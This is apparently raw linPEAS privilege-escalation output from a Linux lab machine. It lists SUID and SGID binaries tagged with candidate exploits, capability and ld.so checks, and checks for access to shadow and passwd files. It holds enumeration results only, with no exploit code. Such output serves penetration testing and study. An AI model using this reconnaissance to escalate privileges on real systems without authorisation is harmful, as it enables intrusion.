iEYEABEKAAYFAlNrkrEACgkQQJdur0N9BbV7RgCfbZGjC7ejdU5fMW6Kbk6bRQcS
G2sAn1h7znlqgxolQOhYVAnsfmu96aTbiQIcBAABCgAGBQJTa5KxAAoJEDtP5qzA
sh8yat4QALTR1k1DKijcCu9NHWm0p5iz6+cFOmUnYS8ewjhS3Oy5mk9WjXLTpOID
BBykbsXnNIEpx4nvPhwX2jb/8XJNIT5pyhHDD7ydbQsDsQnhaah1gBwd5ZP3gwpF
9IGJ15V4737rqeifYNKohn8//4GQsoIuhzyMOqIq8lIpOJyKzWvJm9ToW7kurF1d
yQvB2rdXgOLUgXnpzsLu3Xw/p0bY+OUkdTxbfg+UxOIvwI1DYOPrTq/vPunMkA0C
QuXv7yTdYiWWoV3IUqzF5iwY0nJAcfH6bBmyXXgr9WY9QXSw+CUjMfTI3EPCG8Rw
8Z9z7LJ8zeH7DucaDkSVmPUE8uKPspc7CHuZ5b09O435TdbiargNAXwRNKKlEXcr
1bQ2CZfve5jxKv3g7xEk4C/LpNMd/0w7DsqIuw6lRwoc4vNqdPlQMjywnHFNYTDl
s5Tilg2T2pSE9SRRhLQtGAVP2VU5AD/WJfAUDHM5zLm9avZKsOphiTuXDJkaZxr7
eMn1kQyzCh30ac9zJukh8PfEREY/BT8JFC7qWWUZ2zeevsOQZJ0WHL/lm6TZRsgX
84qD7Z2UrTClnTNd6CUKHm6ispT9uC/BTFZ7efrw8mTPJotBNOpPNgmOVXFKsuoh
SyHY769UhUN2MeCGjsLjee5jRg2moS421UmBZbeRgicH92BUaWzL
=7r4e
-----END PGP SIGNATURE-----

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3637 Apr  8  2014 /etc/skel/.bashrc                                                                                
-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 /home/ryan/.bashrc

-rw-r--r-- 1 root root 675 Apr  8  2014 /etc/skel/.profile
-rw-r--r-- 1 ryan ryan 675 Sep  2  2020 /home/ryan/.profile

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                   
                                         ╚═══════════════════╝                                                                            
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                          
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6                                                                                        
-rwsr-xr-x 1 root root 31K Dec 16  2013 /bin/fusermount
-rwsr-xr-x 1 root root 93K Jun  3  2014 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 37K Feb 16  2014 /bin/su
-rwsr-xr-x 1 root root 68K Jun  3  2014 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 46K Feb 16  2014 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 23K May  7  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 41K Feb 16  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 152K Feb 10  2014 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 32K Feb 16  2014 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Feb 16  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 74K Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root root 46K Feb 16  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                              
-rwsr-xr-x 1 root root 10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 431K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 304K Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 11K Apr 12  2014 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-- 1 root dip 336K Jan 22  2013 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 libuuid libuuid 19K Jun  3  2014 /usr/sbin/uuidd

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                          
-rwxr-sr-x 1 root crontab 36K Feb  8  2013 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 54K Feb 16  2014 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Jun  4  2013 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 283K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root mail 15K Dec  6  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Feb 16  2014 /usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root tty 19K Jun  3  2014 /usr/bin/wall
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root mlocate 39K Jun 20  2013 /usr/bin/mlocate
-rwsr-sr-x 1 libuuid libuuid 19K Jun  3  2014 /usr/sbin/uuidd
-rwxr-sr-x 1 root shadow 35K Jan 31  2014 /sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                  
/etc/ld.so.conf                                                                                                                           
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                           
Current capabilities:                                                                                                                     
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000001fffffffff

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000001fffffffff

Files with capabilities (limited to 50):

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                           
                                                                                                                                          
╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                   
files with acls in searched folders Not Found                                                                                             
                                                                                                                                          
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                
/usr/bin/gettext.sh                                                                                                                       

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                               
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                         
total 12                                                                                                                                  
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 86 root root 4096 Jan  7 19:10 ..
-rw-r--r--  1 root root  663 Apr  7  2014 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                           
                                                                                                                                          
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                              
═╣ Credentials in fstab/mtab? ........... No                                                                                              
═╣ Can I read shadow files? ............. No                                                                                              
═╣ Can I read shadow plists? ............ No                                                                                              
═╣ Can I write shadow plists? ........... No                                                                                              
═╣ Can I read opasswd file? ............. No                                                                                              
═╣ Can I write in network-scripts? ...... No                                                                                              
